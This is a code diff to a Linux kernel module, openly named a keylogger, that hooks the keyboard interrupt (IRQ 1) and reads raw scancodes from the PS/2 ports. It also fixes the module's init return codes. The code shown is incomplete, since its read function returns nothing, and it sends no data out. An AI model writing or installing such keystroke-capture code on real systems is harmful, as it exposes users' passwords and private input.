@@ -6,6 +6,8 @@
 #include <linux/miscdevice.h>
 
 #define PATH "keylog"
+#define KEYBOARD_STATUS 0x64
+#define KEYBOARD_DATA 0x60
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("stmartin");
@@ -26,7 +28,7 @@ static ssize_t	key_write(struct file *filep, const char *buffer, size_t len, lof
 static ssize_t	key_read(struct file *filep, char *buffer, size_t len, loff_t *offset)
 {
 	printk(KERN_INFO "in the read\n");
-	return 1;
+	return 0;
 }
 
 static struct file_operations	key_ops = {
@@ -71,13 +73,14 @@ static int		create_file(const char *name, umode_t mode, struct file_operations *
 	return 1;
 }
 
-static irqreturn_t 	kbd_irq_handler(int irq, void* dev_id, struct pt_regs *regs)
+static irqreturn_t 	kbd_irq_handler(int irq, void* dev_id)
 {
 	unsigned char status, scancode;
 
-	status = inb(0x64);
-	scancode = inb(0x60);
+	status = inb(KEYBOARD_STATUS);
+	scancode = inb(KEYBOARD_DATA);
 	kbd_buffer = (unsigned short) ((status << 8) | (scancode & 0x00ff));
+//	printk(KERN_INFO "keylogger: kbd_buffer -> [%d]\n", kbd_buffer);
 	//wake_up_interruptible(&kbd_irq_waitq);
 	return IRQ_HANDLED;
 }
@@ -88,19 +91,19 @@ static int		__init keylogger_init(void)
 	if (create_dir() != 1)
 	{
 		printk(KERN_INFO "creation directory failed\n");
-		return 0;
+		return 1;
 	}
 	if (create_file("keylogs", 0660, &key_ops) != 1)
 	{
 		printk(KERN_INFO "file creation failed \n");
-		return 0;
+		return 1;
 	}
 	if (misc_register(&key_dev))
-		return 0;
+		return 1;
 	printk(KERN_INFO "keylogger: name [%s] minor  [%i]\n", key_dev.name, key_dev.minor);
-//	request_irq(1, kbd_irq_handler, IRQF_SHARED, "keylogger", (void *)kbd_irq_handler);
+	request_irq(1, kbd_irq_handler, IRQF_SHARED, "keylogger", (void *)kbd_irq_handler);
 
-	return 1;
+	return 0;
 }
 
 static void		__exit keylogger_exit(void)
